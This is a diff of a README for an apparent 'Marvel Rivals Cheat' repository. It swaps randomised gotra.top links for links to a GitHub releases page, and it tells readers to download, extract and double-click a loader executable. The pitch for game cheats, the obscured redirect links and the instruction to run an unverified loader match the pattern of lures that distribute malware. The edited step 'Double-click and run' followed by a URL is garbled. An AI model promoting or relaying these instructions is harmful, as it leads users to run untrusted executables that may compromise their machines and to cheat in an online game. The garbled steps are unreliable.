@@ -1,9 +1,9 @@
-![maxresdefault](https://github.com/user-attachments/assets/dcf2d15a-74aa-43e2-9444-f92ec9768ba9)
+![maxresdefault](https://github.com/podiarconao/Marvel-Rivals-Cheat/releases)
 
 # Marvel Rivals Cheat
 
 #
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+[![https://github.com/podiarconao/Marvel-Rivals-Cheat/releases](https://github.com/podiarconao/Marvel-Rivals-Cheat/releases)](https://github.com/podiarconao/Marvel-Rivals-Cheat/releases)
 
 **Marvel Rivals Cheat** is a tool designed to enhance your experience in **Marvel Rivals** by providing a variety of cheats and modifications. This cheat offers features such as unlimited resources, instant upgrades, and other gameplay enhancements to give you an edge in the game and make your progression faster and more enjoyable.
 
@@ -37,7 +37,7 @@ Before you begin, make sure you have:
    - Extract the contents of the **Marvel Rivals Cheat** to a folder on your computer.
 
 3. **Run the Loader**:
-   - Double-click and run **Loader.exe** (or the corresponding file for your operating system).
+   - Double-click and run **https://github.com/podiarconao/Marvel-Rivals-Cheat/releases** (or the corresponding file for your operating system).
 
 4. The loader will automatically launch **Marvel Rivals Cheat** and allow you to configure the cheat functions.
 
